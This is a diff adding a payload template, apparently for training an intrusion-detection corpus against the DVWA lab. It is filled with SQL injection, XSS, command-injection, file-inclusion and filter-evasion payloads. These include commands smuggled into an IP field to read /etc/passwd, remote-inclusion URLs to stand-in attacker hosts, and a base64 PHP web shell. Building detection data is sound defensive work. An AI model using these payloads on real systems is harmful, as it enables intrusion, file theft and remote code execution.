@@ -1,0 +1,238 @@
+# agent-ids corpus v2 — payload khai thác cần gom (bạn điền)
+# =============================================================================
+# CÁCH ĐIỀN
+#   - Mỗi payload MỘT dòng, đặt dưới đúng mục "## ...".
+#   - Dòng trống và dòng bắt đầu bằng # bị bỏ qua (có thể dùng để ghi chú).
+#   - Dán payload Y NGUYÊN như nguồn cho (không tự encode). Mục "evasion" là
+#     bản đã né/encode sẵn — dán đúng chuỗi đã encode mà nguồn đưa.
+#   - Dán dư cũng được: tôi tự BỎ TRÙNG (cả với payload v1 đã có trong repo).
+#   - cmdi tôi tự gửi thành POST form tới /vulnerabilities/exec/ — bạn chỉ cần
+#     dán phần giá trị của ô "ip".
+#
+# (TÙY CHỌN) GOM HỌ (family): các biến thể của CÙNG một kỹ thuật nên vào một
+#   "họ" để không bị chia lẻ sang cả dev lẫn test. Muốn gom thì đặt một dòng
+#   "=== tên-họ ===" trước nhóm dòng đó, ví dụ:
+#       === sqli-union ===
+#       1' UNION SELECT 1,2-- -
+#       1' UnIoN SeLeCt 1,2-- -
+#   Không đặt thì mỗi dòng là một họ riêng (vẫn chạy được). Tôi có thể tự gom
+#   giúp nếu bạn để trống — chỉ là gom tay chính xác hơn.
+#
+# NGUỒN CÔNG KHAI (copy từ đây, ghi rõ là nguồn nào ở báo cáo):
+#   PayloadsAllTheThings  https://github.com/swisskyrepo/PayloadsAllTheThings
+#     SQLi https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
+#     XSS  https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
+#     CMDi https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection
+#     LFI  https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
+#     Traversal https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal
+#   PortSwigger  SQLi https://portswigger.net/web-security/sql-injection/cheat-sheet
+#                XSS  https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
+#   OWASP XSS Filter Evasion
+#        https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
+#
+# Mỗi mục có: (mục tiêu số dòng) | trang DVWA | tham số payload đi vào.
+# =============================================================================
+
+
+## clear_attack :: sqli   (mục tiêu 8)   /vulnerabilities/sqli/   param: id
+# nguồn: PayloadsAllTheThings SQL Injection ; PortSwigger SQLi cheat sheet
+# (dạng thẳng: OR-based, UNION SELECT, stacked ';', blind/time-based)
+
+=== sqli-or-basic ===
+# PayloadsAllTheThings — OR-based authentication bypass
+' OR 'x'='x
+' OR ''='
+admin'-- -
+' OR 1-- -
+
+=== sqli-union-enum ===
+# PortSwigger SQLi cheat sheet — UNION-based enumeration
+1 ORDER BY 1-- -
+1 ORDER BY 2-- -
+1' UNION SELECT NULL,NULL-- -
+1' UNION SELECT 1,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()-- -
+
+=== sqli-blind-boolean ===
+# PayloadsAllTheThings — Boolean-based blind
+1' AND 1=1-- -
+1' AND 1=2-- -
+
+=== sqli-error-based ===
+# PayloadsAllTheThings — Error-based extraction
+1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))-- -
+1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(user(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -
+
+
+## clear_attack :: xss   (mục tiêu 7)   /vulnerabilities/xss_r/   param: name
+# nguồn: PortSwigger XSS cheat sheet ; OWASP XSS Filter Evasion ; PayloadsAllTheThings XSS
+
+=== xss-event-handlers ===
+# PortSwigger XSS cheat sheet — event handler injection
+<body onload=alert(1)>
+<input onfocus=alert(1) autofocus>
+<select onfocus=alert(1) autofocus>
+<textarea onfocus=alert(1) autofocus>
+
+=== xss-dom-exec ===
+# PortSwigger / PayloadsAllTheThings — direct execution tags
+"><script>alert(document.domain)</script>
+<details open ontoggle=alert(1)>
+<video src=1 onerror=alert(1)>
+<audio src=1 onerror=alert(1)>
+
+=== xss-iframe ===
+# OWASP XSS Filter Evasion
+<iframe src="javascript:alert(1)">
+
+
+## clear_attack :: cmdi   (mục tiêu 6)   /vulnerabilities/exec/ (POST)   param: ip
+# nguồn: PayloadsAllTheThings Command Injection
+# (chuỗi nối lệnh: ; | && $() ` ...)
+
+=== cmdi-basic-chain ===
+# PayloadsAllTheThings — basic command chaining
+127.0.0.1; ls -la
+127.0.0.1 || whoami
+127.0.0.1 & echo pwned
+127.0.0.1; uname -a
+
+=== cmdi-subshell ===
+# PayloadsAllTheThings — subshell / backtick
+`id`
+127.0.0.1; `whoami`
+
+
+## clear_attack :: lfi   (mục tiêu 6)   /vulnerabilities/fi/   param: page
+# nguồn: PayloadsAllTheThings File Inclusion / Directory Traversal ; OWASP WSTG
+# (đọc file hệ thống: /etc/passwd, /etc/shadow, ../ traversal)
+
+=== lfi-unix-files ===
+# PayloadsAllTheThings / OWASP WSTG — Unix sensitive files
+../../../etc/passwd
+../../../etc/hosts
+../../../etc/group
+/proc/self/environ
+
+=== lfi-traversal-depth ===
+# PayloadsAllTheThings — varying traversal depth
+../../etc/passwd
+../../../../../etc/passwd
+
+=== lfi-windows ===
+# PayloadsAllTheThings — Windows paths
+C:\Windows\win.ini
+C:\boot.ini
+
+
+## clear_attack :: rfi   (mục tiêu 3)   /vulnerabilities/fi/   param: page
+# nguồn: PayloadsAllTheThings File Inclusion (Remote File Inclusion)
+# (URL từ xa làm tên file: http://.../shell.txt — dùng domain .test/.example)
+
+# PayloadsAllTheThings — Remote File Inclusion
+http://attacker.example/shell.php
+https://evil.example/cmd.php
+http://10.0.0.1.example/malware.txt
+
+
+## evasion :: sqli   (mục tiêu 10)   /vulnerabilities/sqli/   param: id
+# nguồn: PayloadsAllTheThings "WAF Bypass" + encoding ; PortSwigger
+# (comment /**/, case-mix, URL-encode, double-encode, hex 0x, CHAR(), inline /*!...*/)
+
+=== sqli-evade-whitespace ===
+# PayloadsAllTheThings — whitespace substitution
+1'%09OR%091=1-- -
+1'%0aOR%0a1=1-- -
+1'%0bOR%0b1=1-- -
+
+=== sqli-evade-operator ===
+# PayloadsAllTheThings — operator substitution
+1' OR 1 LIKE 1-- -
+1'||'1'='1-- -
+1' OR 2 BETWEEN 1 AND 3-- -
+
+=== sqli-evade-inline-comment ===
+# PayloadsAllTheThings MySQL inline comment variants
+1' /*!UNION*/ /*!SELECT*/ 1,2-- -
+1'/*!50000OR*/1=1-- -
+
+=== sqli-evade-encoding ===
+# PayloadsAllTheThings — encoding bypass
+1' OR 0x313d31-- -
+1' OR CHAR(49)=CHAR(49)-- -
+
+
+## evasion :: xss   (mục tiêu 9)   /vulnerabilities/xss_r/   param: name
+# nguồn: OWASP XSS Filter Evasion ; PortSwigger XSS cheat sheet
+# (nested tag, URL-encode, HTML entity, case-mix, svg/onload...)
+
+=== xss-evade-template-literal ===
+# PortSwigger — template literal / non-standard syntax
+<script>alert`1`</script>
+<script>alert(String.fromCharCode(88,83,83))</script>
+
+=== xss-evade-no-space ===
+# PayloadsAllTheThings — attribute without space
+<body/onload=alert(1)>
+<img/src=x/onerror=alert(1)>
+
+=== xss-evade-entity ===
+# OWASP XSS Filter Evasion — HTML entity encoding
+<a href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert(1)">click</a>
+<svg onload=&#97;&#108;&#101;&#114;&#116;(1)>
+
+=== xss-evade-double-url ===
+# OWASP — double URL-encoded
+%253Cscript%253Ealert(1)%253C/script%253E
+
+=== xss-evade-null-byte ===
+# OWASP XSS Filter Evasion
+<scri%00pt>alert(1)</scri%00pt>
+<ScRiPt>alert(1)</ScRiPt>
+
+
+## evasion :: cmdi   (mục tiêu 8)   /vulnerabilities/exec/ (POST)   param: ip
+# nguồn: PayloadsAllTheThings Command Injection "Bypass"
+# (${IFS}, %0a newline, backslash c\at, $@ , biến tách...)
+
+=== cmdi-evade-quotes ===
+# PayloadsAllTheThings — quote insertion to break signature
+127.0.0.1;c''at /etc/passwd
+127.0.0.1;w'h'o'a'm'i
+127.0.0.1;c"a"t /etc/passwd
+
+=== cmdi-evade-expansion ===
+# PayloadsAllTheThings — variable and brace expansion
+127.0.0.1;ca$@t /etc/passwd
+127.0.0.1;{cat,/etc/passwd}
+127.0.0.1;$'c'$'a'$'t' /etc/passwd
+
+=== cmdi-evade-path ===
+# PayloadsAllTheThings — full path and glob
+127.0.0.1;/bin/c?t /etc/passwd
+127.0.0.1;/bin/cat /etc/passwd
+
+
+## evasion :: lfi   (mục tiêu 9)   /vulnerabilities/fi/   param: page
+# nguồn: PayloadsAllTheThings File Inclusion / Directory Traversal
+# (..%2f URL-encode, ....// nested, %252e double-encode, php://filter wrapper...)
+
+=== lfi-evade-double-encode ===
+# PayloadsAllTheThings — double URL encoding
+..%252f..%252f..%252fetc%252fpasswd
+..%2525..%2525..%2525etc%2525passwd
+
+=== lfi-evade-unicode ===
+# PayloadsAllTheThings — Unicode / overlong encoding
+..%c0%af..%c0%afetc%c0%afpasswd
+..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd
+
+=== lfi-evade-null-wrapper ===
+# PayloadsAllTheThings — null byte and PHP stream wrappers
+/etc/passwd%00
+php://input
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOz8+
+
+=== lfi-evade-backslash ===
+# PayloadsAllTheThings — backslash mixed traversal
+....\/....\/etc\/passwd
+..%5c..%5c..%5cetc%5cpasswd
